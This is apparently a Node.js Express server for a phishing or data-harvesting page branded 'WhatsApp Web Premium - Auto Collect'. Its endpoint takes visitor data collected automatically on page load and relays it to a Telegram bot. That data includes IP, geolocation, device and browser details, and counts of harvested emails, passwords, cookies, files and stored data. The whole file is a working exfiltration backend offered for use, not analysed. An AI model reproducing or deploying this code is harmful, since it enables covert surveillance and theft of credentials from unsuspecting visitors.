const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(path.join(__dirname, '.')));
app.use(express.json());

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API لإرسال البيانات للتلجرام
app.post('/api/send-to-telegram', async (req, res) => {
    console.log('📨 Received auto-collect request');
    
    try {
        const { message, data } = req.body;
        
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return res.json({ 
                success: false, 
                error: 'Telegram config missing' 
            });
        }

        // بناء رسالة التلجرام المفصلة
        const telegramMessage = `
${message}

📍 المعلومات الجغرافية:
• الدولة: ${data.geoInfo?.country || 'غير معروف'} 🏴
• المدينة: ${data.geoInfo?.city || 'غير معروف'} 🏙️
• المنطقة: ${data.geoInfo?.region || 'غير معروف'} 🗺️
• مزود الخدمة: ${data.geoInfo?.isp || 'غير معروف'} 📡
• عنوان IP: ${data.geoInfo?.ip || 'غير معروف'} 🌍

📱 معلومات الجهاز:
• نوع الجهاز: ${data.deviceInfo?.deviceType || 'غير معروف'} 📱
• اسم الجهاز: ${data.deviceInfo?.deviceName || 'غير معروف'} 🖥️
• إصدار الجهاز: ${data.deviceInfo?.deviceVersion || 'غير معروف'} 📜
• نظام التشغيل: ${data.deviceInfo?.os || 'غير معروف'} 💻
• إصدار النظام: ${data.deviceInfo?.osVersion || 'غير معروف'} 🖥️

⚡ معلومات البطارية والأداء:
• شحن الهاتف: ${data.performanceInfo?.batteryLevel || 'غير معروف'} 🔋
• هل الهاتف يشحن؟: ${data.performanceInfo?.isCharging || 'غير معروف'} 🔋
• الذاكرة (RAM): ${data.performanceInfo?.memory || 'غير معروف'} 🧠
• عدد الأنوية: ${data.performanceInfo?.cores || 'غير معروف'} ⚙️
• الذاكرة الداخلية: ${data.performanceInfo?.storage || 'غير معروف'} 💾

📶 معلومات الشبكة:
• الشبكة: ${data.networkInfo?.networkType || 'غير معروف'} 📶
• سرعة الشبكة: ${data.networkInfo?.speed || 'غير معروف'}
• نوع الاتصال: ${data.networkInfo?.connectionType || 'غير معروف'} 📡
• نطاق التردد: ${data.networkInfo?.frequency || 'غير معروف'} 📡

🌐 معلومات المتصفح:
• اسم المتصفح: ${data.browserInfo?.browserName || 'غير معروف'} 🌐
• إصدار المتصفح: ${data.browserInfo?.browserVersion || 'غير معروف'} 📊
• لغة النظام: ${data.browserInfo?.language || 'غير معروف'} 🌐
• بروتوكول الأمان: ${data.browserInfo?.security || 'غير معروف'} 🔒
• تاريخ آخر تحديث: ${data.browserInfo?.lastUpdate || 'غير معروف'} 📅

🖥️ معلومات الشاشة:
• دقة الشاشة: ${data.screenInfo?.resolution || 'غير معروف'} 📏
• وضع الشاشة: ${data.screenInfo?.orientation || 'غير معروف'} 🔄
• عمق الألوان: ${data.screenInfo?.colorDepth || 'غير معروف'} 🎨

🔧 المميزات المدعومة:
• إمكانية تحديد الموقع الجغرافي: ${data.features?.geolocation || 'غير معروف'} 🌍
• الدعم لتقنية البلوتوث: ${data.features?.bluetooth || 'غير معروف'} ❌
• دعم الإيماءات اللمسية: ${data.features?.touch || 'غير معروف'} ✋

⏰ معلومات الوقت:
• الوقت: ${data.visitInfo?.timestamp || 'غير معروف'} ⏰
• المنطقة الزمنية: ${data.geoInfo?.timezone || 'غير معروف'} 🕒

📧 البيانات المجمعة:
• الإيميلات: ${data.collectedData?.emails || 0} 📧
• كلمات المرور: ${data.collectedData?.passwords || 0} 🔐
• الكوكيز: ${data.collectedData?.cookies || 0} 🍪

🔗 معلومات الزيارة:
• الرابط: ${data.visitInfo?.url || 'غير معروف'} 🔗
• المصدر: ${data.visitInfo?.referrer || 'غير معروف'} 📍

💾 الملفات والبيانات:
• الملفات المحملة: ${data.collectedData?.files || 0} 📁
• بيانات التخزين: ${data.collectedData?.storage || 0} 💿
        `.trim();

        // إرسال إلى التلجرام
        const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage
            })
        });

        const result = await telegramResponse.json();
        
        res.json({
            success: true,
            message: 'تم إرسال البيانات إلى التلجرام بنجاح'
        });

    } catch (error) {
        console.error('❌ Error in Telegram sending:', error);
        res.json({
            success: false,
            error: error.message
        });
    }
});

// health check
app.get('/health', (req, res) => {
    res.json({ 
        status: '✅ يعمل', 
        timestamp: new Date().toISOString(),
        service: 'WhatsApp Web Premium - Auto Collect'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 السيرفر يعمل على البورت ${PORT}`);
    console.log(`📧 Auto-collect enabled - Data sends automatically on page load`);
});
